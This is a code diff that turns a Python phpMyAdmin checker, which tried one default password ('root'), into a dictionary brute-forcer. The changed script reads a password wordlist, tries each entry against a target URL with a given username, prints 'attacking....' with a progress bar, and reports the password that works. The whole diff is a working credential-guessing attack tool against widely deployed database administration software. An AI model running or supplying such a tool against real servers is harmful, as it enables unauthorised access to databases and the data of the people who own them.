@@ -1,6 +1,8 @@
 import re
+import os
 import requests
 import optparse
+import progressbar
 from colorama import Fore,Back,Style
 
 def req(url,username,password):
@@ -27,19 +29,29 @@ def option():
     return parser,options
 
 def main():
+    flag = False
     parser,args = option()
-    try:
-        res = req(args.url,args.username,'root')
-        login_success = re.compile(r'opendb_url')
-        success = login_success.search(res.text)
+    if args.password:
+        f = open(args.password,"r") 
+        lines = f.readlines()      #读取全部内容 ，并以列表方式返
+        p = progressbar.ProgressBar()
+        print(Fore.RED + "attacking....")
+        for line in p(lines):
+            password = line
+            try:
+                res = req(args.url,args.username,password)
+                login_success = re.compile(r'opendb_url')
+                success = login_success.search(res.text)
 
-        if success:
-            print(Fore.GREEN + "[+] PHPMyAdmin is vulerable")
-        else:
+                if success:
+                    flag = True
+                    print(Fore.GREEN + "\n[+] PHPMyAdmin is vulerable")
+                    print("Phpmyadin password is " + password)
+                    break   
+            except Exception as e:
+                print(Fore.YELLOW + '执行异常{}'.format(e))
+                parser.print_help()
+        if not flag:
             print(Fore.RED + "[*] PHPMyAdmin is not vulerable")
-    except Exception as e:
-        print(Fore.YELLOW + '执行异常{}'.format(e))
-        parser.print_help()
-
 if __name__ == '__main__':
     main()
